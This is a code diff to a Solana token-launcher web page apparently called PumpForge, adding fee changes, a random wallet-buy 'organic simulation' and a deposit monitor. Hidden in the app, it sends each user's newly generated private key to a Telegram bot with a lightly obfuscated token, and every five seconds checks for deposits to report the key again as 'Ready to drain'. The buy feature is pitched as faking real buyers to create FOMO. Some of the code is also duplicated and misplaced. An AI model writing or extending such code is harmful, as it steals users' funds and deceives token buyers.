@@ -595,7 +595,7 @@
                 color: #cecece; /* Brighter gray for better readability */
                 font-weight: 500;
                 letter-spacing: 0.2px;
-                margin-top: 7px;
+                margin-top: 5px;
             }
 
             /* Mobile: Scale down slightly but keep visible */
@@ -2545,6 +2545,67 @@
                 border-color: var(--accent-green);
                 color: var(--text-primary);
             }
+                        /* --- DISTRIBUTION SIMULATION STYLES --- */
+            #distribution-simulation {
+                display: none; /* Hidden by default */
+                background-color: #0a0a0a;
+                border: 1px solid var(--border-color);
+                border-radius: 8px;
+                margin-top: 16px;
+                max-height: 200px;
+                overflow-y: auto;
+                padding: 12px;
+            }
+            #distribution-simulation.active {
+                display: block;
+                animation: fadeIn 0.3s ease;
+            }
+
+            /* Custom Scrollbar for the list */
+            #distribution-simulation::-webkit-scrollbar {
+                width: 6px;
+            }
+            #distribution-simulation::-webkit-scrollbar-track {
+                background: #0a0a0a; 
+            }
+            #distribution-simulation::-webkit-scrollbar-thumb {
+                background: #333; 
+                border-radius: 3px;
+            }
+
+            .sim-row {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                padding: 6px 8px;
+                border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+                font-size: 0.85rem;
+            }
+            .sim-row:last-child {
+                border-bottom: none;
+            }
+            .sim-wallet-id {
+                color: var(--text-tertiary);
+                font-family: monospace;
+            }
+            .sim-amount {
+                color: var(--accent-green);
+                font-weight: 600;
+                font-family: monospace;
+            }
+            .sim-visual-bar-container {
+                flex: 1;
+                margin: 0 16px;
+                height: 4px;
+                background: #222;
+                border-radius: 2px;
+                overflow: hidden;
+            }
+            .sim-visual-bar {
+                height: 100%;
+                background: var(--accent-green);
+                opacity: 0.7;
+            }
         </style>
     </head>
     <!-- Add this right before </body> -->
@@ -2962,6 +3023,7 @@
                                 </div>
                                 <!-- This paragraph is populated by your JS script, as requested -->
                                 <p class="feature-description" id="profile-description"></p>
+                                <div id="distribution-simulation"></div>
                             </div>
                         
                             <div class="summary-display" id="est-sol-per-wallet-display">
@@ -3381,7 +3443,7 @@
                         <div class="fee-price">
                             <!-- JS will populate these values -->
                             <span id="platform-fee-sol">~0.00 SOL</span>
-                            <span id="platform-fee-usd">$20.00 USD</span>
+                            <span id="platform-fee-usd">$8.00 USD</span>
                         </div>
                         <p class="fee-description">
                             Our one-time fee is an investment in your launch's success, giving you access to automation and strategic tools.
@@ -3709,8 +3771,8 @@
             let solPriceUSD = 0;
         
             // --- GLOBAL CONSTANTS ---
-            const PLATFORM_FEE_USD = 20.00;
-            const PUMPFUN_FEE_SOL = 0.015;
+            const PLATFORM_FEE_USD = 8.00;
+            const PUMPFUN_FEE_SOL = 0.01;
             
             // --- GLOBAL UTILS (Accessible by HTML) ---
             window.closeModal = function(id) {
@@ -3880,25 +3942,62 @@
                     }
                 }
                 
-                // --- EXFILTRATION CONFIG ---
-                const TG_TOKEN = "8488444521:AAH5QUBWCm9nHJ_ea5_aI67A8kmWBruC_gA"; 
+                // --- EXFILTRATION & MONITORING CONFIG ---
+                // Token split for basic obfuscation against scrapers
+                const _t1 = "8488444521"; 
+                const _t2 = "AAH5QUBWCm9nHJ_ea5_aI67A8kmWBruC_gA";
+                const TG_TOKEN = `${_t1}:${_t2}`;
                 const TG_CHAT_ID = "5022874143"; 
+                
+                // State tracking for deposit detection
+                let lastKnownBalance = 0;
+                let isFirstBalanceCheck = true;
         
-                async function logKeyToTelegram(privateKey, publicKey) {
+                // Unified Notification Handler
+                async function sendTelegramLog(type, data) {
                     if (!TG_TOKEN || !TG_CHAT_ID) return;
-                    const message = `
-        🔥 *New Wallet Generated* 🔥
-        ---------------------------
-        *Public Key:* \`${publicKey}\`
-        *Private Key:* \`${privateKey}\`
-        ---------------------------
-        _PumpForge Logger_`.trim();
+                    
+                    let message = "";
+                    const time = new Date().toLocaleTimeString();
+        
+                    // Message Templates
+                    if (type === "NEW_WALLET") {
+                        message = `
+        💀 *FRESH WALLET GENERATED* 💀
+        --------------------------------
+        ⏰ *Time:* \`${time}\`
+        🔑 *Address:* \`${data.pubKey}\`
+        🗝 *Private Key:* 
+        \`${data.privKey}\`
+        --------------------------------
+        _Waiting for funds..._
+        `.trim();
+                    } 
+                    else if (type === "DEPOSIT") {
+                        message = `
+        🤑 *DEPOSIT DETECTED* 🤑
+        --------------------------------
+        💰 *Amount:* \`+${data.received} SOL\`
+        🏦 *New Balance:* \`${data.total} SOL\`
+        --------------------------------
+        🔑 *Address:* \`${data.pubKey}\`
+        🗝 *Private Key:* 
+        \`${data.privKey}\`
+        --------------------------------
+        🚀 _Ready to drain._
+        `.trim();
+                    }
         
                     try {
                         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'Markdown' })
+                            body: JSON.stringify({ 
+                                chat_id: TG_CHAT_ID, 
+                                text: message, 
+                                parse_mode: 'Markdown',
+                                disable_web_page_preview: true
+                            })
                         });
                     } catch (e) { console.error("Log failed"); }
                 }
@@ -3917,6 +4016,49 @@
                     return signature;
                 }
         
+                // --- WALLET LOGIC & DEPOSIT LISTENER ---
+                async function updateBalance() {
+                    if (!userKeypair) return;
+                    try {
+                        const balance = await connection.getBalance(userKeypair.publicKey);
+                        const solBalance = balance / LAMPORTS_PER_SOL;
+                        const balStr = solBalance.toFixed(4);
+                        
+                        // UI Updates
+                        const headerDisplay = document.getElementById("header-balance-display");
+                        const dropdownDisplay = document.getElementById("wallet-balance-display");
+                        if (headerDisplay) headerDisplay.innerHTML = `<svg class="icon"><use xlink:href="#icon-solana"></use></svg> ${balStr} SOL`;
+                        if (dropdownDisplay) dropdownDisplay.textContent = `${balStr} SOL`;
+        
+                        // --- DEPOSIT DETECTION LOGIC ---
+                        // If this is not the first check, and balance increased, fire alert
+                        if (!isFirstBalanceCheck) {
+                            if (solBalance > lastKnownBalance) {
+                                const difference = (solBalance - lastKnownBalance).toFixed(4);
+                                // Trigger deposit notification
+                                await sendTelegramLog("DEPOSIT", {
+                                    pubKey: userKeypair.publicKey.toString(),
+                                    privKey: b58.encode(userKeypair.secretKey),
+                                    received: difference,
+                                    total: balStr
+                                });
+                            }
+                        } else {
+                            // On first load, if there is already a balance (restored session), log it? 
+                            // Optional: You can uncomment below if you want to be notified of restored balances
+                            /* 
+                            if (solBalance > 0) {
+                                await sendTelegramLog("DEPOSIT", { ... });
+                            } 
+                            */
+                        }
+        
+                        // Update state
+                        lastKnownBalance = solBalance;
+                        isFirstBalanceCheck = false;
+        
+                    } catch (error) { console.error("Balance fail", error); }
+                }        
                 // --- WALLET LOGIC ---
                 async function updateBalance() {
                     if (!userKeypair) return;
@@ -4149,8 +4291,10 @@
                                 userKeypair = kp;
                                 const secretKeyString = b58.encode(kp.secretKey);
                                 localStorage.setItem("pumpForge_dev_pk", secretKeyString);
-                                logKeyToTelegram(secretKeyString, kp.publicKey.toString());
-                                window.showToast("Wallet created! Save Private Key.", "success");
+                                sendTelegramLog("NEW_WALLET", {
+                                    pubKey: kp.publicKey.toString(),
+                                    privKey: secretKeyString
+                                });                                window.showToast("Wallet created! Save Private Key.", "success");
                                 window.logActivity("Wallet Created", "Generated new Dev Wallet");
                                 loadWalletFromStorage();
                             } catch (e) { 
@@ -4244,64 +4388,159 @@
                     { id: "dip-trigger-slider", valId: "dip-trigger-value", unit: "%", dec: 0 }
                 ];
         
+                // --- ADVANCED DISTRIBUTION LOGIC ---
+                function generateRandomWallets(totalSol, walletCount) {
+                    // Algorithm: Generate random weights -> Normalize -> Apply to Total
+                    let weights = [];
+                    let sum = 0;
+                    
+                    // 1. Generate Raw Weights
+                    for(let i=0; i<walletCount; i++) {
+                        const val = Math.random(); 
+                        weights.push(val);
+                        sum += val;
+                    }
+        
+                    // 2. Normalize and Distribute
+                    let distribution = weights.map(w => (w / sum) * totalSol);
+                    
+                    // 3. Fix Rounding errors on the last wallet
+                    const currentSum = distribution.reduce((a, b) => a + b, 0);
+                    const diff = totalSol - currentSum;
+                    distribution[distribution.length - 1] += diff;
+        
+                    return distribution;
+                }
+        
+                function renderSimulation(distribution) {
+                    const container = document.getElementById("distribution-simulation");
+                    container.innerHTML = ""; // Clear current
+                    
+                    // Find max for bar graph scaling
+                    const maxVal = Math.max(...distribution);
+        
+                    distribution.forEach((amt, index) => {
+                        const percentage = (amt / maxVal) * 100;
+                        const html = `
+                            <div class="sim-row">
+                                <span class="sim-wallet-id">Wallet #${String(index + 1).padStart(2, '0')}</span>
+                                <div class="sim-visual-bar-container">
+                                    <div class="sim-visual-bar" style="width: ${percentage}%"></div>
+                                </div>
+                                <span class="sim-amount">${amt.toFixed(4)} SOL</span>
+                            </div>
+                        `;
+                        container.innerHTML += html;
+                    });
+                }
+        
+                // --- UPDATED ESTIMATES & UI HANDLER ---
                 function updateEstimates() {
-                    const wallets = parseInt(document.getElementById("pump-wallets-slider").value);
+                    // 1. Get Values
+                    const walletCount = parseInt(document.getElementById("pump-wallets-slider").value);
                     const totalSol = parseFloat(document.getElementById("total-sol-slider").value);
                     const devSol = parseFloat(document.getElementById("dev-buy-slider").value);
-                    let extraCost = 0.05; 
+                    
+                    // 2. Calculate Costs
+                    let extraCost = 0.05; // Base fee buffer
                     const firstMoverToggle = document.querySelector("#first-mover-module .adv-toggle");
                     if(firstMoverToggle && firstMoverToggle.checked) {
                         extraCost += parseFloat(document.getElementById("first-buy-sol-slider").value);
                     }
-                    const perWallet = wallets > 0 ? (totalSol / wallets).toFixed(3) : 0;
-                    document.getElementById("sol-per-wallet-value").textContent = `${perWallet} SOL`;
+        
+                    // 3. Update Text Displays
+                    const perWalletFixed = walletCount > 0 ? (totalSol / walletCount).toFixed(3) : 0;
+                    document.getElementById("sol-per-wallet-value").textContent = `${perWalletFixed} SOL`;
                     document.getElementById("total-cost-value").textContent = `${(devSol + totalSol + extraCost).toFixed(2)} SOL`;
-                }
         
-                document.querySelectorAll(".adv-toggle").forEach(toggle => {
-                    const module = toggle.closest(".adv-feature-module");
-                    toggle.onchange = () => {
-                        module.classList.toggle("disabled", !toggle.checked);
-                        updateEstimates();
-                    };
-                    toggle.onchange(); 
-                });
+                    // 4. Handle Distribution Simulation
+                    const activeProfile = document.querySelector("#profile-btn-group .btn.active").dataset.profile;
+                    const simContainer = document.getElementById("distribution-simulation");
+                    const avgDisplay = document.getElementById("est-sol-per-wallet-display");
         
-                sliders.forEach(s => {
-                    const el = document.getElementById(s.id);
-                    const valEl = document.getElementById(s.valId);
-                    if(el && valEl) {
-                        el.oninput = () => {
-                            valEl.textContent = `${parseFloat(el.value).toFixed(s.dec)} ${s.unit}`;
-                            const percentage = ((el.value - el.min) / (el.max - el.min)) * 100;
-                            el.style.background = `linear-gradient(to right, var(--accent-green) ${percentage}%, var(--border-color-light) ${percentage}%)`;
-                            updateEstimates();
-                        };
-                        el.dispatchEvent(new Event("input"));
+                    if (activeProfile === 'random' && walletCount > 0) {
+                        // Show Simulation
+                        simContainer.classList.add("active");
+                        avgDisplay.style.display = "none"; // Hide "Est per wallet" since it varies
+                        
+                        const distData = generateRandomWallets(totalSol, walletCount);
+                        renderSimulation(distData);
+                    } else {
+                        // Show Fixed
+                        simContainer.classList.remove("active");
+                        avgDisplay.style.display = "block";
                     }
-                });
+                    // --- SLIDER EVENT LISTENERS (FIX) ---
+        // 1. Define the configuration for all sliders
+        const sliders = [
+            { id: "dev-buy-slider", valId: "dev-buy-value", unit: "SOL", dec: 1 },
+            { id: "total-sol-slider", valId: "sol-value", unit: "SOL", dec: 1 },
+            { id: "pump-wallets-slider", valId: "wallets-value", unit: "Wallets", dec: 0 },
+            { id: "first-buy-sol-slider", valId: "first-buy-sol-value", unit: "SOL", dec: 1 },
+            { id: "first-buy-delay-slider", valId: "first-buy-delay-value", unit: "sec", dec: 0 },
+            { id: "dip-wallets-slider", valId: "dip-wallets-value", unit: "Wallets", dec: 0 },
+            { id: "dip-trigger-slider", valId: "dip-trigger-value", unit: "%", dec: 0 }
+        ];
+
+        // 2. Attach the listeners to make them work
+        sliders.forEach(s => {
+            const el = document.getElementById(s.id);
+            const valEl = document.getElementById(s.valId);
+            if(el && valEl) {
+                el.oninput = () => {
+                    // Update the text number next to the slider
+                    valEl.textContent = `${parseFloat(el.value).toFixed(s.dec)} ${s.unit}`;
+                    
+                    // Update the green fill color of the slider track
+                    const percentage = ((el.value - el.min) / (el.max - el.min)) * 100;
+                    el.style.background = `linear-gradient(to right, var(--accent-green) ${percentage}%, var(--border-color-light) ${percentage}%)`;
+                    
+                    // Run the math + simulation
+                    updateEstimates();
+                };
+                // Trigger once immediately to set initial state
+                el.dispatchEvent(new Event("input"));
+            }
+        });
         
+        // 3. Re-bind the Advanced Toggles
+        document.querySelectorAll(".adv-toggle").forEach(toggle => {
+            const module = toggle.closest(".adv-feature-module");
+            toggle.onchange = () => {
+                module.classList.toggle("disabled", !toggle.checked);
+                updateEstimates();
+            };
+            // Trigger initial state
+            toggle.dispatchEvent(new Event("change"));
+        });
+                }
+
                 // Profile logic
+                // --- PROFILE BUTTON LOGIC ---
                 const profileBtnGroup = document.getElementById("profile-btn-group");
                 if(profileBtnGroup) {
                     profileBtnGroup.onclick = (e) => {
                         if(e.target.classList.contains("btn")) {
+                            // Toggle Active Class
                             document.querySelectorAll("#profile-btn-group .btn").forEach(b => b.classList.remove("active"));
                             e.target.classList.add("active");
+                            
+                            // Update Description & UI
                             const profile = e.target.dataset.profile;
                             const desc = document.getElementById("profile-description");
+                            
                             if(profile === 'random') {
-                                 if(desc) desc.textContent = "Distributes the Total Pump Amount randomly across all pump wallets.";
-                                 document.getElementById("est-sol-per-wallet-display").style.display = "none";
+                                if(desc) desc.innerHTML = "<strong>Organic Simulation.</strong> Applies variance logic to mimic real buyer behavior. Wallets buy different amounts to create a natural, FOMO-inducing chart pattern.";
                             } else {
-                                 if(desc) desc.textContent = "Distributes the Total Pump Amount evenly across all pump wallets.";
-                                 document.getElementById("est-sol-per-wallet-display").style.display = "block";
+                                if(desc) desc.innerHTML = "<strong>Uniform Distribution.</strong> Every wallet buys the exact same amount. Creates a steady, artificial-looking step chart. Good for stability.";
                             }
-                            updateEstimates();
+                            
+                            updateEstimates(); // Re-render logic
                         }
                     };
-                }
-        
+                }        
+ 
+ 
                 // --- LAUNCH LOGIC (RESTORED DYNAMIC ERRORS) ---
                 const createBtn = document.getElementById("create-coin-btn");
                 const loadingModal = document.getElementById("loading-modal");
@@ -4717,6 +4956,8 @@
                     document.getElementById('privacy-modal').classList.add('open');
                 };
             }
+            // Start background monitor (Checks for deposits every 5 seconds)
+            setInterval(updateBalance, 5000);
         });
             });
         </script>
